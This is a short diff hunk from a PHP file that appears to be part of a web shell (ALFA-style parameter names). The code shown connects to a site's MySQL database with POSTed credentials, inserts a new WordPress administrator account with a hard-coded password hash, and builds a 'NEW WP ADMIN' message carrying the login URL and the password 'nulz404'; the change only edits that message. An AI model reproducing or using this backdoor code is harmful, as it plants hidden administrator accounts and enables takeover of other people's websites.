@@ -3909,7 +3909,7 @@ $password = $_POST['alfa6'];
 $admin = $_POST['alfa8'];
 $SQL = $_POST['alfa9'];
 $prefix = $_POST['alfa10'];
-$wpLOG = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0A%0AUsername: ".$username."%0A%0APassword: nulz404";
+$wpLOG = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0AAUsername: ".$admin."%0APassword: nulz404";
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','5f95e92c65559eca58ddf9fac90c7b02','$SQL')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
